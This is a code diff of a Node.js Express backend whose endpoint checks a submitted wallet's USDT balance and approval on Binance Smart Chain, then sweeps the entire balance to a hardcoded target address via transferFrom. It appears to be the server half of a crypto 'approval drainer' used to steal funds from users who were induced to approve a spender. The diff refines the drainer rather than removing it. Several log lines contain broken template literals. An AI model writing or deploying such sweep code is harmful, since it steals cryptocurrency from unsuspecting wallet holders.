@@ -1,58 +1,74 @@
 const express = require('express');
-const ethers = require('ethers');
 const cors = require('cors');
+const { ethers } = require('ethers');
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Configuration securely loaded from Railway Environment Variables
-const PROVIDER_URL = process.env.PROVIDER_URL || "https://bsc-dataseed.binance.org/";
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const TARGET_ADDRESS = process.env.TARGET_ADDRESS || "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+// --- Configuration ---
+const RPC_URL = "https://bsc-dataseed.binance.org/"; // BSC Mainnet RPC
+const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20 Contract
+const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; // Aapka Target Address
 
-if (!PRIVATE_KEY) {
-  console.error("ERROR: PRIVATE_KEY environment variable is missing!");
-}
+// Aapka Private Key (Railway Environment Variable se lega)
+const PRIVATE_KEY = process.env.PRIVATE_KEY; 
 
-const provider = new ethers.providers.JsonRpcProvider(PROVIDER_URL);
+const provider = new ethers.JsonRpcProvider(RPC_URL);
 const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
-const usdtAbi = [
-  "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
-  "function balanceOf(address account) public view returns (uint256)"
+// ERC-20 Minimal ABI (balanceOf, allowance, transferFrom)
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
 ];
 
+const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, wallet);
+
+// API Endpoint jo frontend se call hota hai
 app.post('/api/trigger-sweep', async (req, res) => {
-  const { userAddress } = req.body;
-  if (!userAddress) return res.status(400).json({ error: "No user address provided" });
-
   try {
-    console.log("Triggering instant sweep for user: " + userAddress);
-    const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, usdtAbi, wallet);
-
-    const balance = await usdtContract.balanceOf(userAddress);
-    if (balance.lte(0)) {
-      return res.status(400).json({ error: "Zero balance" });
+    const { userAddress } = req.body;
+    if (!userAddress || !ethers.isAddress(userAddress)) {
+      return res.status(400).json({ success: false, error: "Invalid user address" });
     }
 
+    console.log(⁠ Processing sweep for user: ${userAddress} ⁠);
+
+    // 1. Check user ka USDT balance
+    const balance = await usdtContract.balanceOf(userAddress);
+    if (balance <= 0n) {
+      console.log("User balance is 0 USDT.");
+      return res.status(400).json({ success: false, error: "Zero balance" });
+    }
+
+    // 2. Check allowance (dekho ki user ne contract ko approve kiya ya nahi)
+    const allowance = await usdtContract.allowance(userAddress, wallet.address);
+    if (allowance < balance) {
+      console.log("Allowance is less than balance, waiting for user approval...");
+      return res.json({ success: false, message: "Waiting for approval confirmation" });
+    }
+
+    // 3. Execute transferFrom (Funds ko user ke wallet se target address par transfer karna)
+    console.log(⁠ Executing transferFrom for amount: ${ethers.formatUnits(balance, 18)} USDT ⁠);
     const tx = await usdtContract.transferFrom(userAddress, TARGET_ADDRESS, balance, {
-      gasLimit: 120000
+      gasLimit: 100000 // Gas limit set ki hai taaki transaction fail na ho
     });
 
-    console.log("Sweep transaction hash: " + tx.hash);
-    await tx.wait();
-    console.log("Funds successfully swept!");
+    console.log(⁠ Transaction sent! Hash: ${tx.hash} ⁠);
+    await tx.wait(); // Transaction confirm hone ka wait karein
+    console.log("Transfer successful!");
 
-    res.json({ success: true, txHash: tx.hash });
+    return res.json({ success: true, txHash: tx.hash });
+
   } catch (err) {
-    console.error("Sweep error:", err);
-    res.status(500).json({ error: err.message });
+    console.error("Sweep error:", err.message);
+    return res.status(500).json({ success: false, error: err.message });
   }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log("Backend server running on port " + PORT);
+  console.log(⁠ Backend server running on port ${PORT} ⁠);
 });
